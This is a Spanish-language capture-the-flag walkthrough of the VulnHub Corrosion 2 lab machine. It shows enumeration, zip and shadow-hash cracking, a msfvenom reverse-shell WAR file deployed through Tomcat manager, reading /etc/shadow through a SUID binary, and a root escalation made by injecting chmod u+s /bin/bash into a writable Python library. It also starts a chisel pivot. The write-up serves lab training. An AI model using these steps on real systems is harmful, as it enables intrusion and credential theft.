# VULNHUB PEN TESTING LABS
## MACHINE CORROSION2
> ![alt text](https://i.postimg.cc/W1sWHPSr/corrosion2.png)
---

### Sinopsis 
Corrosion 1 es una máquina Linux categorizado como fácil en vulnhub.
### Habilidades Aprendidas

> * Note: On this machine we have configured an internal network to Pivot to Corrosion 1
> * Web Enumeration
> * Information Leakage + Cracking ZIP File
> * Abusing Tomcat - Creating a malicious WAR file [RCE]
> * Abusing SUID Binary - Reading privileged files
> * Cracking Hashes
> * Manipulating the code of a Python library with incorrectly configured permissions [Privilege Escalation]
> * EXTRA: Pivoting Lab with Corrosion 1

## Enumeración y Escaneo

Para iniciar la fase de reconocimiento, se utilizara la herramienta `arp-scan` para identificar la ip del equipo.

### Escaneo y enumeración de servicios
Para la etapa de identificación de viulnerabilidades utilizamos la herramienta *_nmap_*, que servirá para verificar los servicioes y puertos expuestos.

#### Identicación de puertos y servicios con nmap. 65535 Puertos.
```bat
# nmap -p- --open -T5 -v -n -oG allPorts <IP>
# nmap  -p- --open -sS --min-rate 5000-vvv -n -Pn <IP> -oG allPorts
```
A continuación el significado de los parametros de nmap.

>* *_-p-_*: Ejecuta la validación sobre todos los puertos 65535.
>* *_-T[0-5]_*: Corresponde a la plantilla del temporizado entre mas alto es el numero, el escaneo es mas rapido y mas ruidoso o intrusivo, el numero 5 es ideal para entornos controlados.
>* *_-v_*: Aumentar el nivel de mensajes detallados (use -vvv para aumentar el efecto).
>* *_-n_*: Le indica a Nmap que nunca debe realizar resolución DNS inversa de las direcciones IP activas que encuentre. Ya que DNS es generalmente lento, esto acelera un poco las cosas.
> * *_-Pn_*: Este parametro evita que se aplique resolución de host discovery, a travéz del protocolo arp.
> * *_-oG_*: -oN/-oX/-oS/-oG \<file>: Guardar el sondeo en formato normal, y Grepeable (para usar con grep) respectivamente, al archivo indicado.
> * *_-sS_*: Análisis TCP SYN/Connect()/ACK.
> * *_--min-rate 5000_*: emite paquete no mas lentos a 5000 paquetes por segundo.
> * *_--open_*: muestra solo los puertos abiertos.

#### Resultado formato grepeable -oG

```java
───────┬────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: allPorts
───────┼────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ # Nmap 7.93 scan initiated Wed Jan 18 23:13:46 2023 as: nmap -p- --open -sS --min-rate 5000 -n -Pn -vvvv -oG allPorts 192.168.200.151
   2   │ # Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
   3   │ Host: 192.168.200.151 ()    Status: Up
   4   │ Host: 192.168.200.151 ()    Ports: 22/open/tcp//ssh///, 80/open/tcp//http///, 8080/open/tcp//http-proxy///  Ignored State: closed (65532)
   5   │ # Nmap done at Wed Jan 18 23:13:49 2023 -- 1 IP address (1 host up) scanned in 2.88 seconds
───────┴────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```
Una vez escaneado se puede evidenciar que encontró abierto los puertos, para lo que se puede ejecutar un escaneo mejorado a nivel se scritps con nmap.
#### Resultado formato nmap -oN
```ruby
───────┬────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: targeted
───────┼────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ # Nmap 7.93 scan initiated Wed Jan 18 23:19:09 2023 as: nmap -p22,80,8080 -sCV -vvvv -oN targeted 192.168.200.151
   2   │ Nmap scan report for 192.168.200.151
   3   │ Host is up, received arp-response (0.00071s latency).
   4   │ Scanned at 2023-01-18 23:19:10 -05 for 8s
   5   │ 
   6   │ PORT     STATE SERVICE REASON         VERSION
   7   │ 22/tcp   open  ssh     syn-ack ttl 64 OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
   8   │ | ssh-hostkey: 
   9   │ |   3072 6ad8446080397ef02d082fe58363f070 (RSA)
  10   │ | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCxEaMV/cOFTyD2I2ITIKwQ4b/bNPssxteT2yDAFcUeWUEMen6sr0RS9Wa7pk0ywsbDR/nTrbvSXCVumjaF2UG1nf5d0iu7RgSOWmtWNllMCmH8fUqBXoSVTsR6C2n/CIr4x1WouXKep
       │ cVQyQ0v6iVVgKwTy8C06pvK5ICjXstMSIBmcjZHTM9YDf5JuG3EesBHRHMyocnVQqO6NYmgy+FGkMBFk1zHhGmdhda51ytboYcG+sRr2Q9k0iR4RhnusTOt9xDnw0SVo3ZdrXzSnVTj+ygTrYI2rL50cn0sdvVytO+CmM0Vy2cFttu9VTRC
       │ tJQyTkjTZFHWauu7KZoylWkzI1rWUtV20jJ4OXpYtxoftOyJQ6uEGi+5uHUuEcsgw/8NjdEAZzfxyB0C3E+8BTV+mdIY4nInPMFDJiYcCKuCEbnC0IxmgtNrMU2zD8wdDDKySnlgF69pGrVmm3qlxgj/TuNbPlmrAstHh0H5g1wOrCJ+1ku
       │ DJ95MEdhc04GQzEE=
  11   │ |   256 f2a662d7e76a94be7b6ba512692efed7 (ECDSA)
  12   │ | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBGxpt6dy/vLgPLED7QAa6QzXPOM8gfxHIx/HE0cZcFlxrCK3DRxdcCPONcmhwbqqLL0Z7MJkkkRl9gVGSk9lPUc=
  13   │ |   256 28e10d048019be44a64873aae86a6544 (ED25519)
  14   │ |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGm+Z5eBYojM8OUzktuagXJ2mCuNStyVTbcaDcLYTele
  15   │ 80/tcp   open  http    syn-ack ttl 64 Apache httpd 2.4.41 ((Ubuntu))
  16   │ |_http-title: Apache2 Ubuntu Default Page: It works
  17   │ | http-methods: 
  18   │ |_  Supported Methods: OPTIONS HEAD GET POST
  19   │ |_http-server-header: Apache/2.4.41 (Ubuntu)
  20   │ 8080/tcp open  http    syn-ack ttl 64 Apache Tomcat 9.0.53
  21   │ |_http-title: Apache Tomcat/9.0.53
  22   │ |_http-favicon: Apache Tomcat
  23   │ | http-methods: 
  24   │ |_  Supported Methods: GET HEAD POST OPTIONS
  25   │ |_http-open-proxy: Proxy might be redirecting requests
  26   │ MAC Address: 00:0C:29:A0:24:DD (VMware)
  27   │ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
  28   │ 
  29   │ Read data files from: /usr/bin/../share/nmap
  30   │ Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
  31   │ # Nmap done at Wed Jan 18 23:19:18 2023 -- 1 IP address (1 host up) scanned in 8.49 seconds
───────┴────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```
A continuación el significado de los parametros de nmap.

>* *_-sC_*: Escanee conn scripts básicos de enumeración.
>* *_-sV_*: Detecta la version y servicio que corren para los puertos.
>* *_-pNPORTS_*: Que el escanee se ejecute sobre esos puertos.
>* *_-oN_*: Exporte en formato nmap.

#### Recopilacion de información de servidores http.

Para hacer recolección de información se puede utilizar la herramienta whatweb, en la que se puede identificar que existen servidores de apache y tomcat
```java
┌──(s3cur1ty3c㉿kali)-[~/CTF/vulnhub/corrosion2/nmap]
└─$ whatweb 192.168.200.151:80
http://192.168.200.151:80 [200 OK] Apache[2.4.41], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[192.168.200.151], Title[Apache2 Ubuntu Default Page: It works]
                                                                                                                                                                     
┌──(s3cur1ty3c㉿kali)-[~/CTF/vulnhub/corrosion2/nmap]
└─$ whatweb 192.168.200.151:8080
http://192.168.200.151:8080 [200 OK] Country[RESERVED][ZZ], HTML5, IP[192.168.200.151], Title[Apache Tomcat/9.0.53]
```
#### Fuzzing http

Para hacer enumeración de http, se puede utilizar gobuster y extraer las extensiones de los archivos.

```java
┌──(root㉿kali)-[/home/…/CTF/vulnhub/corrosion2/nmap]
└─# gobuster dir -u http://192.168.200.151:8080 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -t 20 -x txt,zip,html,php
===============================================================
Gobuster v3.4
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.200.151:8080
[+] Method:                  GET
[+] Threads:                 20
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.4
[+] Extensions:              txt,zip,html,php
[+] Timeout:                 10s
===============================================================
2023/01/19 00:00:18 Starting gobuster in directory enumeration mode
===============================================================
/docs                 (Status: 302) [Size: 0] [--> /docs/]
/examples             (Status: 302) [Size: 0] [--> /examples/]
/backup.zip           (Status: 200) [Size: 33723]
/readme.txt           (Status: 200) [Size: 153]
/manager              (Status: 302) [Size: 0] [--> /manager/]
```
En la enumeración de archivos se puede verificar el dos archivos `.zip .txt`, el archivo .zip se encuentra cifrado por lo que se puede usar un ataque de diccionario para encontrar la contraseña.


```ruby
┌──(s3cur1ty3c㉿kali)-[~/CTF/vulnhub/corrosion2/content]
└─$ 7z l backup.zip 

7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=es_EC.UTF-8,Utf16=on,HugeFiles=on,64 bits,128 CPUs Intel(R) Core(TM) i7-8550U CPU @ 1.80GHz (806EA),ASM,AES-NI)

Scanning the drive for archives:
1 file, 33723 bytes (33 KiB)

Listing archive: backup.zip

--
Path = backup.zip
Type = zip
Physical Size = 33723

   Date      Time    Attr         Size   Compressed  Name
------------------- ----- ------------ ------------  ------------------------
2021-09-06 14:09:00 .....        13052         2911  catalina.policy
2021-09-06 14:09:00 .....         1400          721  context.xml
2021-09-06 14:09:00 .....         7276         2210  catalina.properties
2021-09-06 14:09:00 .....         1149          626  jaspic-providers.xml
2021-09-06 14:09:00 .....         2313          862  jaspic-providers.xsd
2021-09-06 14:09:00 .....         4144         1076  logging.properties
2021-09-06 14:09:00 .....         7589         2609  server.xml
2021-09-16 23:07:06 .....         2972         1167  tomcat-users.xml
2021-09-06 14:09:00 .....         2558          858  tomcat-users.xsd
2021-09-06 14:09:00 .....       172359        18917  web.xml
------------------- ----- ------------ ------------  ------------------------
2021-09-16 23:07:06             214812        31957  10 files
                                                                                                                                                                                            
┌──(s3cur1ty3c㉿kali)-[~/CTF/vulnhub/corrosion2/content]
└─$ ls -la
drwxr-xr-x s3cur1ty3c s3cur1ty3c 4.0 KB Thu Jan 19 14:08:22 2023  .
drwxr-xr-x s3cur1ty3c s3cur1ty3c 4.0 KB Wed Jan 18 23:10:58 2023  ..
.rw-r--r-- s3cur1ty3c s3cur1ty3c  33 KB Thu Sep 16 23:15:44 2021  backup.zip
                                                                                                                                                                                            
┌──(s3cur1ty3c㉿kali)-[~/CTF/vulnhub/corrosion2/content]
└─$ 7z x backup.zip 

7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=es_EC.UTF-8,Utf16=on,HugeFiles=on,64 bits,128 CPUs Intel(R) Core(TM) i7-8550U CPU @ 1.80GHz (806EA),ASM,AES-NI)

Scanning the drive for archives:
1 file, 33723 bytes (33 KiB)

Extracting archive: backup.zip
--
Path = backup.zip
Type = zip
Physical Size = 33723

    
Enter password (will not be echoed):
```

A continuación el significado de los parametros de 7z.

>* *_l_*: Se usa listar el contenido del archivo .zip.
>* *_x_*: Se usa para descomprimir los archivos.

Para usar un ataque de fuerza fruta se puede utilizar la herramienta zip2jhon.

```java                                                                                                                                                                                       
┌──(s3cur1ty3c㉿kali)-[~/CTF/vulnhub/corrosion2/content]
└─$ zip2john backup.zip > hash

┌──(s3cur1ty3c㉿kali)-[~/CTF/vulnhub/corrosion2/content]
└─$ cat hash      
───────┬────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: hash
───────┼────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ backup.zip:$pkzip$8*1*1*0*8*24*6920*948f83df8e3188341e0c4ced81b85ffe507a30f1c8bb3d60d228d81ba45b3044c40d51f4*1*0*8*24*6920*6af6b41285729172215c7a912286e6312228c5142b6e537384c0ad6b
       │ 9a6e40b2de98422e*1*0*8*24*6920*d042ed9f0787c684de489fd42ddd00403556c0caaeeabff6ca78e998731732959a1a7adf*1*0*8*24*6920*034f00f26675d81f70f7de491b1c645f15032c9ab52aa2c6157156996a72a
       │ 9a6a138c8e6*1*0*8*24*b0e3*9f16689c61f4dc5fb5405d409a9c4814354c0dba919313e1903a9580daa135342c46fea3*1*0*8*24*6920*7046a2cc2a19fdf9e44c52bdd3b1a9d458ca7e751d2ec883c4d808c79087fb2606
       │ 344d59*1*0*8*24*6920*6ae99725253d7986459879f818798e0fe14dd1a533635704c24831f0acbceab71f99b284*2*0*272*47d*748a87a6*17dd*4e*8*272*6920*502768ce9a11db8105560cdc8ea3b12cb91e5fa10d15b
       │ 79fdc5335826c2f4a6e4112818ff5cce6e766548eef59eafabd29a2c2de3308487c980603b3867bb62bb60e65451a1fd9bb068ff01a4c2e98a8bbb56dd0f392338b147324bbd34ab2e63d2b80882029705f3803ead22980591e
       │ a52cab28fad58ad94838283fd7e267478f9a3e7f645f60ca4d0a227cef99c3db46184f8521dc4dd30f4102ad006dd04a7d054a9018f55730511ccd34bd15a50ebbd1012d4ba320b23fa925ede6d62e3929c137b959813290f0b
       │ f0e2a9ca075d1b6b511fb525a5289c32d29365132e25432f855f982f37e4a5fde6901e8f889218d987067920133a4b26ceecc5f3d28f40cb33601cff6f803b0eb900a183ef9e13d7e888fc9770fdb9d01ced0c6969f5df03fdc
       │ e418da1d979220b430bee9dc21fa63f33b2c1f7b99f848ca5b618d0b6d6eb56ec3748595f1ca1c01492d6464fd1cf73ecd92b6bea1bccc9b8795b1d6087e9205b8e6c5122f83e3625c145b563e1763578d002e0feea455a19d7
       │ 4831c64f69440a3cbcb7b679f683c238984873b7a80df997f11e5d924fe98d1baef30bfce5efb613e82eab136e3844b0e326508b1dac80b2f863b35efdbfa95138d9994699da813c8bb8bc4e7c885b851db53f85d8f1d39f32d
       │ fda36477a64821ea03e444866882c6b64d446feb650780e26fab3701fd0743ac26cacefde996ccfe538776ea101c1d3aec81660613bd65eb34569139ee0845e7f7d1e8b12f8ed43ef58e9580c58ab2cfe170981c72256b4b12c
       │ c152771546d0ea9077d368c3ddc2c63819b00b3dd3581ab8908561cd8ad722c21d9a891922d8b52444f4fca9278a1a96e926cf19125ec20a327e8a3ab0aa2b05d4348*$/pkzip$::backup.zip:jaspic-providers.xml, co
       │ ntext.xml, tomcat-users.xsd, jaspic-providers.xsd, logging.properties, tomcat-users.xml, catalina.properties, server.xml:backup.zip
───────┴────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```
una vez con el hash obtenido con la herrameinta john se puede ejecutar un ataque de diccionario para obtener la contraseña, para esto se puede utilizar el diccionario rockyou.txt

```java
┌──(root㉿kali)-[/home/…/CTF/vulnhub/corrosion2/content]
└─# john -w:/usr/share/wordlists/rockyou.txt hash
Created directory: /root/.john
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
@administrator_hi5 (backup.zip)     
1g 0:00:00:01 DONE (2023-01-19 14:35) 0.8474g/s 9747Kp/s 9747Kc/s 9747KC/s @lexutz..9StephiOlarte
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```
De los archivos extraidos buscamos credenciales en el archivo `tomcat-users.xml`

```java
┌──(root㉿kali)-[/home/…/CTF/vulnhub/corrosion2/content]
└─# cat tomcat-users.xml 
────────────────────────────────────────────────────────────────────────────────────────────
File: tomcat-users.xml
────────────────────────────────────────────────────────────────────────────────────────────
<?xml version="1.0" encoding="UTF-8"?>

<tomcat-users xmlns="http://tomcat.apache.org/xml"
              xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
              xsi:schemaLocation="http://tomcat.apache.org/xml tomcat-users.xsd"
              version="1.0">
<role rolename="manager-gui"/>
<user username="manager" password="melehifokivai" roles="manager-gui"/>

<role rolename="admin-gui"/>
<user username="admin" password="melehifokivai" roles="admin-gui, manager-gui"/>
</tomcat-users>
────────────────────────────────────────────────────────────────────────────────────────────
```
Las credentiales obtenidas podemos utlizarlas para loguearnos por la url de tomcat `http://192.168.200.151:8080/manager/` con las credenciales `admin:melehifokivai`, y con eso ganamos acceso la administración de apache tomcat
![alt text](https://i.postimg.cc/W1sWHPSr/corrosion2.png)

En la categoria WAR file to deploy, se puede subir exploits con la extension `.war` y sobre estos generar una shell reversa, para esto se puede utilizar la herramienta msfvenom para generar payload tipo java.

```java
┌──(s3cur1ty3c㉿kali)-[~/CTF/vulnhub/corrosion2/exploits]
└─$ msfvenom -l payloads | grep java
    java/jsp_shell_bind_tcp                                            Listen for a connection and spawn a command shell
    java/jsp_shell_reverse_tcp                                         Connect back to attacker and spawn a command shell
    java/meterpreter/bind_tcp                                          Run a meterpreter server in Java. Listen for a connection
    java/meterpreter/reverse_http                                      Run a meterpreter server in Java. Tunnel communication over HTTP
    java/meterpreter/reverse_https                                     Run a meterpreter server in Java. Tunnel communication over HTTPS
    java/meterpreter/reverse_tcp                                       Run a meterpreter server in Java. Connect back stager
    java/shell/bind_tcp                                                Spawn a piped command shell (cmd.exe on Windows, /bin/sh everywhere else). Listen for a connection
    java/shell/reverse_tcp                                             Spawn a piped command shell (cmd.exe on Windows, /bin/sh everywhere else). Connect back stager
    java/shell_reverse_tcp                                             Connect back to attacker and spawn a command shell
```
> * -l: Sirve para listar los payloads.
Para crear el payload se utiliza el `msfvenom
```java
┌──(s3cur1ty3c㉿kali)-[~/CTF/vulnhub/corrosion2/exploits]
└─$ msfvenom -p java/shell_reverse_tcp LHOST=192.168.200.147 LPORT=443 -f war -o reverse.war
Payload size: 13325 bytes
Final size of war file: 13325 bytes
Saved as: reverse.war
```
> * -p.- Establecer el nombre de payload `java/shell_reverse_tcp`.
> * LHOST.- Direccion IP del host remoto al que se va conectar.
> * LPORT.- Numero de puerto del host remoto al que se va conectar.
> * -f.- Tipor de archivo que se debe generar. `war`
> * -o.- Nombre el archivo que se va a exportar. `reverse.war`

Una vez subido el archivo desde el boton browser en la categoría `WAR file to deploy`, hay que seleccionar deploy para subir el archivo el aparecera en la tabla de aplicaciones.

![alt text](https://i.postimg.cc/SNDXf8KW/corrosion2-1.png)

una vez verificado que el archivo se encuentra subido se selecciona en la tabla de aplicaciones, pero primero hay que pner es escucha una peticion de `nc`.
```java
┌──(root㉿kali)-[/home/…/CTF/vulnhub/corrosion2/exploits]
└─# nc -nlvp 443                                                
listening on [any] 443 ...
```
Una vez seleccionado el archivo reverse y con la conexión `nc` abierta, se ejecuta la concexion de shell reversa.
```java
┌──(root㉿kali)-[/home/…/CTF/vulnhub/corrosion2/exploits]
└─# nc -nlvp 443                                                
listening on [any] 443 ...
connect to [192.168.200.147] from (UNKNOWN) [192.168.200.151] 56230
whoami
tomcat
hostname -I
192.168.200.151 192.168.210.128 
```
Una vez ganada la conexion reversa se debe hacer el tratamiento de la tty, para optmizar el manejo de la bash.

```java
script /dev/null -c bash 
Script started, file is /dev/null
tomcat@corrosion:/var/spool/cron$ ^Z
zsh: suspended  nc -nlvp 443
┌──(root㉿kali)-[/home/…/CTF/vulnhub/corrosion2/exploits]
└─# stty raw -echo; fg                  
[1]  + continued  nc -nlvp 443
                              reset xterm
tomcat@corrosion:/var/spool/cron$ export SHELL=bash
tomcat@corrosion:/var/spool/cron$ export TERM=xterm
```
Se debe probar las contraselas encontradas para intentar cambiar de sesion con los usuarios encontrados.
```java
tomcat@corrosion:/home/randy$ su 
Password: 
$ bash
jaye@corrosion:/home/randy$ cd ~
jaye@corrosion:~$ pwd
/home/jaye
jaye@corrosion:~$ 
```
En la carpeta home del usuario jaye, hay una carpeta files con un archivo con permisos SUID.
```java
jaye@corrosion:~$ ls -la Files/
total 24
drwxr-xr-x  2 root root  4096 Sep 17  2021 .
drwxr-x--x 18 jaye jaye  4096 Sep 17  2021 ..
---s--s--x  1 root root 14728 Sep 17  2021 look
jaye@corrosion:~$ ls -la Files/look 
---s--s--x 1 root root 14728 Sep 17  2021 Files/look
```
al momento de ejecutar el archivo `./look`, se puede asumir que se utiliza para leer archivos por lo que, se puede utilizar para listar la contraseña del usuario randy, adicional se puede evidenciar que se puede pasar un string para porder filtrar el contenido de los archivos.
```java
jaye@corrosion:~/Files$ ./look
usage: look [-bdf] [-t char] string [file ...]
jaye@corrosion:~/Files$ ./look randy /etc/shadow
randy:$6$bQ8rY/73PoUA4lFX$i/aKxdkuh5hF8D78k50BZ4eInDWklwQgmmpakv/gsuzTodngjB340R1wXQ8qWhY2cyMwi.61HJ36qXGvFHJGY/:18888:0:99999:7:::
```
Para hacer crack de hashes se puede utilizar hashcat para hacer un ataque de diccionario,en el presente escenario puede existir demora al momento de ejecutar el ataque, asi que se remcomienda esperar lo necesario.
```java
┌──(root㉿kali)-[/home/…/CTF/vulnhub/corrosion2/content]
└─# hashcat -m 1800 -a 0 randy_hash /usr/share/wordlists/rockyou.txt 
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 3.0+debian  Linux, None+Asserts, RELOC, LLVM 14.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
============================================================================================================================================
* Device #1: pthread-Intel(R) Core(TM) i7-8550U CPU @ 1.80GHz, 6926/13917 MB (2048 MB allocatable), 8MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Single-Hash
* Single-Salt
* Uses-64-Bit

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 0 MB

Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 2 secs

Cracking performance lower than expected?                 

* Append -O to the commandline.
  This lowers the maximum supported password/salt length (usually down to 32).

* Append -w 3 to the commandline.
  This can cause your screen to lag.

* Append -S to the commandline.
  This has a drastic speed impact but can be better for specific attacks.
  Typical scenarios are a small wordlist but a large ruleset.A

* Update your backend API runtime / driver the right way:
  https://hashcat.net/faq/wrongdriver

* Create more work items to make use of your parallelization power:
  https://hashcat.net/faq/morework

[s]tatus [p]ause [b]ypass [c]heckpoint [f]inish [q]uit => s

$6$bQ8rY/73PoUA4lFX$i/aKxdkuh5hF8D78k50BZ4eInDWklwQgmmpakv/gsuzTodngjB340R1wXQ8qWhY2cyMwi.61HJ36qXGvFHJGY/:07051986randy
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 1800 (sha512crypt $6$, SHA512 (Unix))
Hash.Target......: $6$bQ8rY/73PoUA4lFX$i/aKxdkuh5hF8D78k50BZ4eInDWklwQ...FHJGY/
Time.Started.....: Thu Jan 19 18:50:05 2023 (4 hours, 28 mins)
Time.Estimated...: Thu Jan 19 23:18:47 2023 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:      686 H/s (17.28ms) @ Accel:1024 Loops:64 Thr:1 Vec:4
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 13933568/14344385 (97.14%)
Rejected.........: 0/13933568 (0.00%)
Restore.Point....: 13932544/14344385 (97.13%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:4992-5000
Candidate.Engine.: Device Generator
Candidates.#1....: 070591tow -> 0704279
Hardware.Mon.#1..: Util: 84%

Started: Thu Jan 19 18:48:54 2023
Stopped: Thu Jan 19 23:18:50 2023
```
Con la contrasela encontrada `07051986randy`,se a utiliza para hacer cambio de usuario, con el parametreo `su - randy`.

```java
jaye@corrosion:~/Files$ su randy 
Password: 
randy@corrosion:/home/jaye/Files$ 
```
Para verificar los archivos con permips SUID, utilizamos `sudo -l`

```java
randy@corrosion:~$ sudo -l
[sudo] password for randy: 
Matching Defaults entries for randy on corrosion:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User randy may run the following commands on corrosion:
    (root) PASSWD: /usr/bin/python3.8 /home/randy/randombase64.py
```
En la fase listar permisos sudo, encontramos el archivo `randombase64.py` tiene permisos para ejecutarse con usuario root,y listando el contenido con cat se puede verificar que utiliza la libreria `base64`.
```java
randy@corrosion:~$ cat randombase64.py 
import base64
message = input("Enter your string: ")
message_bytes = message.encode('ascii')
base64_bytes = base64.b64encode(message_bytes)
base64_message = base64_bytes.decode('ascii')
print(base64_message)
randy@corrosion:~$ locate base64
```
Para encontrar el archivo `base64.py`, `podemos utilizar locate o which^`, y con los permisos utilizados se pude verificar que el archivo `base64.py` tiene permisos `777`.
```java
randy@corrosion:~$ locate base64
/home/randy/randombase64.py
/snap/core18/2128/usr/bin/base64
/snap/core18/2128/usr/lib/python3.6/base64.py
/snap/core18/2128/usr/lib/python3.6/__pycache__/base64.cpython-36.pyc
/usr/lib/python3.8/base64.py

randy@corrosion:~$ ls -la /usr/lib/python3.8/base64.py
-rwxrwxrwx 1 root root 20386 Sep 20  2021 /usr/lib/python3.8/base64.py
```
A la libreria `base64.py`, se puede agregar la libreria os, para agregar permisos suid de bash y que esto permita escalar privilegios mediante bash.

```java
import os
os.system("chmod u+s /bin/bash ")
```
Para realizar el cambio de los permisos se debe utilizar la instrucción `sudo /usr/bin/python3.8 /home/randy/randombase64.py`

```java
randy@corrosion:~$ ls -la /bin/bash 
-rwxr-xr-x 1 root root 1183448 Jun 18  2020 /bin/bash
randy@corrosion:~$ sudo randy@corrosion:~$ 
sudo: randy@corrosion:~$: command not found
randy@corrosion:~$ sudo /usr/bin/python3.8 /home/randy/randombase64.py
Enter your string: cualqi^H
Y3VhbHFpCA==
randy@corrosion:~$ ls -la /bin/bash
-rwsr-xr-x 1 root root 1183448 Jun 18  2020 /bin/bash
```
Una vez cambiado los privilegios se debe ejecutar `bash -p`, para que se ejecute con los privilegios de usuario root.
```java
randy@corrosion:~$ /bin/bash -p
bash-5.0# whoami
root
bash-5.0# cd /root
bash-5.0# ls -la
total 44
drw-------  5 root root 4096 Sep 20  2021 .
drwxr-xr-x 20 root root 4096 Sep 16  2021 ..
-rw-r--r--  1 root root    5 Sep 20  2021 .bash_history
-rw-r--r--  1 root root 3106 Dec  5  2019 .bashrc
drwx------  2 root root 4096 Aug 19  2021 .cache
drwxr-xr-x  3 root root 4096 Sep 16  2021 .local
-rw-r--r--  1 root root  161 Dec  5  2019 .profile
-rw-------  1 root root    0 Sep 17  2021 .python_history
-rw-r--r--  1 root root   33 Sep 17  2021 root.txt
-rw-r--r--  1 root root   66 Sep 16  2021 .selected_editor
drwxr-xr-x  3 root root 4096 Sep 16  2021 snap
-rw-r--r--  1 root root  181 Sep 17  2021 .wget-hsts
bash-5.0# cat root.txt 
2fdbf8d4f894292361d6c72c8e833a4b
bash-5.0# 
```
## MAQUINA CORROSION1
---
### Hosts Discovery
#### Enumeración de hosts,usando hilos.
Existen varias formas de ejecutar el script utilizando hilos, una de ellas es utilizando el comando xargs que permite ejecutar un comando varias veces con diferentes argumentos.
Aquí hay un ejemplo de cómo podría modificar el script anterior para utilizar hilos con xargs:
```java
#!/bin/bash
# Dirección IP de inicio y final del rango a escanear
start_ip=1
end_ip=254
# Utilizar xargs para ejecutar varias instancias de ping al mismo tiempo
seq $start_ip $end_ip | xargs -P 50 -I{} bash -c 'ping -c 1 192.168.210.{} > /dev/null; if [ $? -eq 0 ]; then echo "La dirección IP {} está activa";fi'
```
Resultado de ejecución del script.
```java
bash-5.0# sh hostDiscovery.sh 
La dirección IP 1 está activa
La dirección IP 128 está activa
La dirección IP 129 está activa
```
### Chisel
Una vez conseguida la flag root, se da por culminado el primer equipo, sin embargo, en el presente escenario existe otro computador mas conectado a otra red por otro, por lo que podemos utilizar chisel para ejecutar remot portforwarding.por lo que se recomienda ver el la pagina de [chisel](https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_linux_amd64.gz)
Para compartir el archivo chisel levantamos un servidor web con python3 desde la maquina atacante y procedemos con la descarga.
```java
┌──(root㉿kali)-[/home/…/CTF/vulnhub/corrosion2/content]
└─# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/)
```
Nos movemos a la carpeta /dev/shm y desde ahi descargarmos chisel y dar permisos de ejecución.
```java
bash-5.0#  pwd
/dev/shm
bash-5.0# wget 192.168.200.147/chisel
--2023-01-20 10:19:16--  http://192.168.200.147/chisel
Connecting to 192.168.200.147:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3107968 (3.0M) [application/octet-stream]
Saving to: ‘chisel’
chisel  100%[====================================================================================================>]   2.96M  --.-KB/s    in 0.07s   
2023-01-20 10:19:16 (45.2 MB/s) - ‘chisel’ saved [3107968/3107968]
bash-5.0# 
bash-5.0# ls -la
-rw-rw-r--  1 root randy 3107968 Jan 30  2022 chisel
bash-5.0# chmod +x chisel 
bash-5.0# ls -la
-rwxrwxr-x  1 root randy 3107968 Jan 30  2022 chisel
bash-5.0# 
```
